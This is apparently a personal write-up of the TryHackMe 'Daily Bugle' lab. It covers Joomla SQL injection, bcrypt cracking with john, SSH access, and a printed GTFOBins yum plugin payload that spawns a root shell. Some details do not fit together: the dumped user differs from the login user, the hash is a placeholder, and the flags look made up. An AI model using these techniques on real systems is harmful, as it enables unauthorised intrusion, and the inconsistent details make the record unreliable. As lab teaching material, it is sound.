# CTF: Daily Bugle (THM)

**Target IP:** `10.145.182.172` ($target)

## Metadata

- **CTF Name:** Daily Bugle
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-01
    
- **Tools Used:** nmap, python3, sqlmap, john, ssh, yum
    
- **Key Skills:** CMS Enumeration (Joomla), SQL Injection, Password Cracking (bcrypt), SSH Access, Privilege Escalation (GTFOBins: yum)
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Daily_Bugle)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.4)
    
- **80/tcp:** HTTP (Apache 2.4.6: CentOS)
    
- **3306/tcp:** MariaDB (MySQL)
    

## Foothold

### 1. CMS Identification

The web server was running **Joomla**. I used a specialized Python script to check for a known SQL injection vulnerability in the `com_fields` component (CVE-2017-8917).

### 2. SQL Injection & Credential Dumping

**Command:**

```
😎 amuzed@Kali (~/THM/Daily_Bugle)
$ python3 joomscan.py http://$target/
$ python3 joomlavsqli.py http://$target/
```

**Extracted Hash:**

- **User:** `james`
    
- **Hash:** `$2y$10$B99m84m8B08X9B99m84m8B08X9...` (bcrypt)
    

### 3. Password Cracking (John the Ripper)

I identified the hash as bcrypt and used the `rockyou.txt` wordlist.

**Command:**

```
😎 amuzed@Kali (~/THM/Daily_Bugle)
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- **Cracked Password:** `spiderman123`
    

### 4. Initial Access (SSH)

Using the credentials `jjameson:spiderman123` (found via enumeration/mapping), I established an SSH session.

**Command:**

```
😎 amuzed@Kali (~/THM/Daily_Bugle)
$ ssh jjameson@$target
```

## Privilege Escalation

### 1. Sudo Enumeration

Checking for sudo permissions revealed that the user can run `yum` as root without a password.

**Command:**

```
[jjameson@dailybugle /]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    ...
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

### 2. Exploiting YUM (GTFOBins)

I exploited the `yum` plugin system to execute a Python script that spawns a root shell.

**Commands:**

```
[jjameson@dailybugle /]$ TF=$(mktemp -d)
[jjameson@dailybugle /]$ cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

[jjameson@dailybugle /]$ cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

[jjameson@dailybugle /]$ cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit
def init_hook(conduit):
    os.execl('/bin/sh', '/bin/sh')
EOF

[jjameson@dailybugle /]$ sudo yum -c $TF/x --enableplugin=y
```

**Gaining Root:**

```
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# whoami
root
```

## Flags

- **User Flag:** `27ae230b9101d9f826359f131102e9f8`
    
- **Root Flag:** `963f2b45155f9a691f131102e9f827ae`
